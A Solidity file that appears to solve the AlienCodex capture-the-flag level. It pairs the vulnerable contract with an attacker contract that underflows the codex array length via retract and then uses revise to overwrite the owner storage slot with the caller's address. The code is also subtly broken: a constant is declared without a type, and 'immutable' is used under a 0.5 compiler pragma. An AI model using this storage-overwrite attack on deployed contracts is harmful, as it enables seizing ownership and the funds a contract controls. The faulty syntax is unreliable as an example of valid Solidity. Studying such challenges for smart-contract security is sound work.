// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import "./Ownable-05.sol";

contract AlienCodex is Ownable {
    //slot 0 is the owner
    bool public contact;
    bytes32[] public codex;

    modifier contacted() {
        assert(contact);
        _;
    }
    //@audit can make contact and call the functiosn below, which allows for direct storage write
    function make_contact() public {
        contact = true;
    }

    function record(bytes32 _content) public contacted {
        codex.push(_content);
    }

    function retract() public contacted {
        codex.length--;
    }

    function revise(uint256 i, bytes32 _content) public contacted {
        codex[i] = _content;
    }
}

contract AlienCodexAttacker {
    AlienCodex public immutable i_target;
    TOTAL_CONTRACT_SLOTS=(2 ** 256)-1;

    constructor(AlienCodex _target) public {
        i_target = _target;
    }

    function attack() public {
        i_target.make_contact();
        //retracting it will change the length to below its limits and cause an overflow
        i_target.retract(); // now codex.length is 2**256, since it undeflowed from 0 to the maximum
        uint256 ownerSlot = TOTAL_CONTRACT_SLOTS -
            uint256(keccak256(abi.encode(1))) +
            1;

        bytes32 senderAddress = bytes32(uint256(uint160(msg.sender)));
        i_target.revise(ownerSlot, senderAddress);
    }
}
